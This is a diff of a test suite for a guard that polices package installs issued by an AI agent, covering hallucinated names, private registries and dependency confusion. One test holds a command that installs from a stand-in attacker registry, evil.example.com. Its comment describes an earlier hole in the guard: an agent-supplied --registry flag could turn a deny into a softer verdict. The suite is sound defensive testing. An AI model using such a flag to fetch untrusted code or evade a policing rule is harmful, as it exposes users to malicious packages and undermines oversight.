@@ -1369,6 +1369,53 @@ describe('ambient config: npm .npmrc downgrades a would-be-404 to unverified, ne
       rmSafe(cwd)
     }
   })
+
+  it('the CACHE-ONLY hot path (checkPackagesCacheOnly — what pipeline.ts actually calls) also resolves an ambient-marked spec directly, never queuing it as a miss', () => {
+    const cwd = makeScratchDir('keel-ambient-npmrc-cacheonly-')
+    writeFileSync(join(cwd, '.npmrc'), 'registry=https://npm.corp.example/\n')
+    try {
+      const rawSpecs = extractPackageInstalls('npm install internal-build-tool')
+      const specs = applyAmbientConfig(rawSpecs, cwd, TEST_ENV)
+      const cache = new PackageVerifierCache(makeScratchDir('keel-ambient-npmrc-cacheonly-state-'))
+      const { results, misses } = checkPackagesCacheOnly(specs, cache)
+      expect(results[0].verdict).toBe('unverified')
+      expect(results[0].reason).toBe('ambient_private_registry')
+      expect(misses).toEqual([]) // never queued for background verification — same contract as private_index (finding 3b)
+    } finally {
+      rmSafe(cwd)
+    }
+  })
+})
+
+describe('ambient config: pipeline end-to-end — the ambient-downgrade case resolves on the FIRST attempt, no retry needed', () => {
+  it('an ambient-private package prompts immediately with the real ambient message (never "not yet checked"), where the no-.npmrc control needs a retry to deny', async () => {
+    const cwdAmbient = makeScratchDir('keel-ambient-pipeline-first-')
+    writeFileSync(join(cwdAmbient, '.npmrc'), 'registry=https://npm.corp.example/\n')
+    const cwdControl = makeScratchDir('keel-ambient-pipeline-first-control-')
+    try {
+      const { fetchImpl } = makeMockRegistry({}) // would 404 -> not_found for either cwd; must never be queried for the ambient one
+      const pipeline = buildPipeline(PACKAGE_RULE, fetchImpl)
+
+      // Ambient case: privateIndex resolves DIRECTLY in checkPackagesCacheOnly
+      // (never queued as a miss — see the cache-only test above), so the
+      // real ambient message lands on attempt ONE, not after a background
+      // fill.
+      const ambientResult = await pipeline.evaluate({ ...makeInput('npm install internal-build-tool'), cwd: cwdAmbient })
+      expect(ambientResult.action).toBe('prompt')
+      expect(ambientResult.message).not.toContain('not yet checked')
+      expect(ambientResult.message).toContain('ambient package-manager config')
+
+      // Control: the identical command with NO ambient config still gets
+      // the ordinary "not yet checked" first-attempt placeholder — proving
+      // the difference above is the ambient fix, not some other change.
+      const controlResult = await pipeline.evaluate({ ...makeInput('npm install internal-build-tool'), cwd: cwdControl })
+      expect(controlResult.action).toBe('prompt')
+      expect(controlResult.message).toContain('not yet checked')
+    } finally {
+      rmSafe(cwdAmbient)
+      rmSafe(cwdControl)
+    }
+  })
 })
 
 describe('ambient config: correctness discipline — malformed/unreadable config never crashes or changes behavior', () => {
@@ -1538,6 +1585,31 @@ describe('ambient config: dependency-confusion detection — ambient private + e
     }
   })
 
+  it('SECURITY: an agent-supplied --registry=<anything> with NO corroborating ambient config on disk is left UNCHANGED — it must never downgrade a deny on its own', async () => {
+    // This is the deny-escape closed during review: an EARLIER version of
+    // applySpecAmbient's npm branch treated ANY --registry= value that
+    // wasn't the public registry as privateIndex, with no ambient signal
+    // required — `npm install <hallucinated> --registry=https://evil.example`
+    // would then never be queried and never deny. Ambient config is written
+    // by a team ahead of time; a command-line flag is written by the same
+    // agent this rule polices, so it can never be trusted alone.
+    const cwd = makeScratchDir('keel-ambient-noescape-')
+    // Deliberately NO .npmrc anywhere in cwd.
+    try {
+      const rawSpecs = extractPackageInstalls('npm install totally-hallucinated-name --registry=https://evil.example.com')
+      const specs = applyAmbientConfig(rawSpecs, cwd, TEST_ENV)
+      expect(specs).toEqual(rawSpecs) // byte-identical — the flag alone changes nothing
+      expect(specs[0]).not.toHaveProperty('privateIndex')
+      expect(specs[0]).not.toHaveProperty('dependencyConfusionRisk')
+
+      const { fetchImpl } = makeMockRegistry({}) // 404 — a real hallucination
+      const results = await checkPackages(specs, { fetchImpl, cache: new PackageVerifierCache(makeScratchDir('keel-ambient-noescape-state-')), registryBaseUrl: 'https://mock.invalid' })
+      expect(decidePackageAction(results, 30).reason).toBe('not_found') // still denies, exactly as it would with no flag at all
+    } finally {
+      rmSafe(cwd)
+    }
+  })
+
   it('pip: -i/--index-url forcing pypi.org triggers confusion; --extra-index-url (additive, not a replacement) never does', () => {
     const cwd = makeScratchDir('keel-ambient-confusion-pip-')
     mkdirSync(join(cwd, '.config', 'pip'), { recursive: true })
@@ -1574,6 +1646,27 @@ describe('ambient config: dependency-confusion detection — ambient private + e
       const second = await pipeline.evaluate(input)
       expect(second.action).toBe('warn')
       expect(second.message).toContain('dependency-confusion')
+    } finally {
+      rmSafe(cwd)
+    }
+  })
+
+  it('pipeline control: the SAME --registry=<public> flag on a name with NO ambient config still denies on retry, exactly as before this feature', async () => {
+    const cwd = makeScratchDir('keel-ambient-confusion-control-')
+    // Deliberately no .npmrc — this is the pre-existing not_found path,
+    // proving the new --registry= handling doesn't touch it.
+    try {
+      const { fetchImpl } = makeMockRegistry({}) // 404 for everything
+      const cap = backgroundCapture()
+      const pipeline = buildPipeline(PACKAGE_RULE, fetchImpl, { packageVerifierOnBackgroundStart: cap.hook })
+      const input = { ...makeInput('npm install totally-hallucinated-name --registry=https://registry.npmjs.org'), cwd }
+
+      const first = await pipeline.evaluate(input)
+      expect(first.action).toBe('prompt') // not_yet_checked, same two-phase design
+
+      await cap.settled()
+      const second = await pipeline.evaluate(input)
+      expect(second.action).toBe('deny') // unaffected by --registry=; still a hard deny on retry
     } finally {
       rmSafe(cwd)
     }
